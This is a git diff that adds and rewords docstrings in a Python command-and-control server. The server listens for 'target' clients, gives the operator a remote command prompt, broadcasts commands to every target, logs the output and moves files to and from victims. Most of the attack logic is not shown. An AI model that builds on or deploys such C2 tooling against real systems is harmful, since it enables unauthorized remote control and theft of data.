@@ -35,7 +35,7 @@ CLIENTS = []  # Target list
 
 
 def clr(msg):
-    """This function colors messages according to their content.
+    """Colors messages according to their content.
 
     :param msg: Message received in clear text
     :type msg: str
@@ -51,6 +51,14 @@ def clr(msg):
 
 
 def get_file_hash(data: list[bytes]) -> str:
+    """
+    Calculates a file md5 hash.
+
+    :param data: File content split into segments
+    :type data: list[bytes]
+    :return: Md5 hash of the file
+    :rtype: str
+    """
     md5 = hashlib.md5()
     for chunk in data:
         md5.update(chunk)
@@ -58,6 +66,15 @@ def get_file_hash(data: list[bytes]) -> str:
 
 
 def download_file(sock: socket.socket, path: str) -> None:
+    """
+    Downloads file from client to server.
+
+    :param sock: Client socket object
+    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    :param path: Target file path
+    :type path: str
+    :return: None
+    """
     # Implemented segmentation when writing / receiving file data to avoid memory overload
     file_name = pathlib.Path(path).name  # File name without the full path
     dst = str(DOWNLOADS.joinpath(file_name))  # Create destination file full path
@@ -102,6 +119,15 @@ def download_file(sock: socket.socket, path: str) -> None:
 
 
 def upload_file(sock: socket.socket, path: str) -> None:
+    """
+    Uploads file from server to client.
+
+    :param sock: Client socket object
+    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    :param path: Target file path
+    :type path: str
+    :return: None
+    """
     # Implemented segmentation when reading / sending file data to avoid memory overload
     path = str(pathlib.Path(path).resolve())  # Absolute path (Resolve symlinks)
     log_result = ""
@@ -148,13 +174,14 @@ def upload_file(sock: socket.socket, path: str) -> None:
 
 
 def recv_msg(sock: socket.socket, command: str) -> None:
-    """This function receives a bash command output from the target and logs it within './c2.log'.
+    """
+    Receives command output from the client and logs it within './c2.log'.
 
-    :param sock: Socket established with the target
-    :type sock: socket(socket.AF_INET, socket.SOCK_STREAM)
+    :param sock: Client socket object
+    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     :param command: Command executed on the client
     :type command: str
-    :return: Bash command output received from the target in clear text
+    :return: Command output received from the client
     :rtype: str
     """
     try:
@@ -189,12 +216,13 @@ def recv_msg(sock: socket.socket, command: str) -> None:
 
 
 def send_msg(sock: socket.socket, command: str) -> None:
-    """This function sends a bash command to the target and prints its output.
+    """
+    Sends a command to the client and prints its output.
     It can also broadcast the bash command to all targets if needed by triggering the 'broadcast' function.
 
-    :param sock: Socket established with the target
-    :type sock: socket(socket.AF_INET, socket.SOCK_STREAM)
-    :param command: Command to run on client
+    :param sock: Client socket object
+    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    :param command: Command to run on the client
     :type command: str
     :return: None
     """
@@ -232,8 +260,16 @@ def send_msg(sock: socket.socket, command: str) -> None:
 
 
 def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
+    """
+    Received commands via input, and executes the appropriate action.
+
+    :param sock: Client socket object
+    :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    :param addr: Client IPv4 address and port number
+    :type addr: tuple[str, int]
+    :return: None
+    """
     try:
-        # Command line interface
         while sock:
             command = input(clr(f"TARGET@{addr}> "))  # Command to run on client side
             if command:
@@ -257,6 +293,13 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
 
 
 def establish_connection(s: socket.socket) -> None:
+    """
+    Listens for clients and accepts incoming connections.
+
+    :param s: Server side bound socket object
+    :type s: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    :return: None
+    """
     s.listen(5)
     sock = ""
     try:
@@ -284,7 +327,7 @@ def establish_connection(s: socket.socket) -> None:
 
 def main() -> None:
     """
-    This is the main function for the C&C server side.
+    Main function for the C&C server side.
 
     :return: None
     """
